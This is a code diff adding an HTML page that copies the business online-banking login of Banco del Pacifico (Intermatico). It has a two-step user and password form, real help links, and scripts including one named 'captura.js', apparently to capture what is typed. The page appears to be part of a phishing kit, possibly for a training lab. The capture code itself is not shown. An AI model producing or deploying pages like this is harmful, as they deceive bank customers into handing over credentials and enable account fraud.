@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Banco del Pacifico - Iniciar sesión</title>
+  <link rel="shortcut icon" href="../assets/icons/pacifico.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../styles/tokens.css">
+  <link rel="stylesheet" href="../styles/base.css">
+  <link rel="stylesheet" href="../styles/sections/root-8a5edab2--backdrop.css">
+  <link rel="stylesheet" href="../styles/sections/root-8a5edab2--masthead.css">
+  <link rel="stylesheet" href="../styles/sections/root-8a5edab2--footer.css">
+  <link rel="stylesheet" href="../styles/sections/empresas-card.css">
+</head>
+<body data-titulo="titulo-empresas">
+  <div class="pac-viewport">
+    <div class="pac-stage" aria-hidden="true"></div>
+    <div class="pac-frame">
+      <div class="pac-strip">
+        <nav class="pac-shortcuts" aria-label="Navegación principal">
+          <a class="pac-shortcuts__link" href="../index.html" data-t="inicio"></a>
+        </nav>
+      </div>
+      <header class="pac-brand">
+        <h1 class="pac-brand__title" data-t="intermatico-titulo"></h1>
+      </header>
+    </div>
+    <main class="emp-main">
+      <div class="emp-inner">
+        <section class="emp-login" aria-label="Ingreso a banca virtual empresas">
+          <br class="emp-clear">
+          <img class="emp-intro" src="../assets/images/empresas-intro.webp" alt="Banco del Pacífico">
+          <br class="emp-clear">
+          <div class="emp-form-wrap emp-form-wrap--user">
+            <form class="emp-form emp-form--user" action="" method="get" novalidate>
+              <div class="emp-label" data-t="usuario"></div>
+              <input class="emp-input" id="emp-user" name="usuario" type="text" maxlength="16" autocomplete="username" aria-label="Usuario">
+              <br class="emp-clear">
+              <br class="emp-clear">
+              <div class="emp-nav">
+                <button class="emp-submit" type="submit" data-t="ingresar"></button>
+              </div>
+              <br class="emp-clear">
+            </form>
+          </div>
+          <div class="emp-form-wrap emp-form-wrap--password" hidden>
+            <form class="emp-form emp-form--password" action="" method="get" novalidate>
+              <div class="emp-label emp-label--pass" data-t="contrasena"></div>
+              <input class="emp-input" id="emp-pass" name="clave" type="password" maxlength="16" autocomplete="current-password" aria-label="Contraseña">
+              <br class="emp-clear">
+              <br class="emp-clear">
+              <div class="emp-nav">
+                <button class="emp-submit" type="submit" data-t="ingresar"></button>
+              </div>
+              <br class="emp-clear">
+              <button class="emp-back" type="button" data-t="volver"></button>
+              <p class="emp-note" hidden></p>
+            </form>
+          </div>
+          <div class="emp-loading" hidden aria-live="polite">
+            <div class="emp-spinner" aria-hidden="true"></div>
+            <p data-t="cargando"></p>
+          </div>
+        </section>
+        <div class="emp-help">
+          <a href="https://www.intermatico.com/Usuario/RecuperarContrasena" data-t="olvido-contrasena"></a> | <span data-t="es-usuario-nuevo"></span> <a href="https://www.intermatico.com/ebanking/seguridad/autoadhesion/datosUsuario.htm" data-t="registrese-aqui"></a>
+        </div>
+        <div class="emp-notice">
+          <p data-t="aviso-empresas"></p>
+        </div>
+      </div>
+    </main>
+  </div>
+  <footer class="pac-footer">
+    <div class="pac-footer__rule"></div>
+    <div class="pac-footer__inner">
+      <div class="pac-footer__compat">
+        <br><span data-t="compat-empresas"></span> <br class="pac-clear"><span data-t="copyright-empresas"></span>
+      </div>
+      <div class="pac-footer__spacer"></div>
+      <div class="pac-footer__security">
+        <strong><a class="pac-footer__link" href="https://www.intermatico.com/Usuario/SeguridadPrincipal" data-t="por-su-seguridad"></a></strong>
+        <br class="pac-clear">
+        <span data-t="verifica-direccion"></span> <br>
+      </div>
+    </div>
+  </footer>
+  <script src="../scripts/textos.js"></script>
+  <script src="../scripts/captura.js"></script>
+  <script src="../scripts/lab-api.js"></script>
+  <script src="../scripts/sections/root-8a5edab2--backdrop.js"></script>
+  <script src="../scripts/empresas.js"></script>
+</body>
+</html>
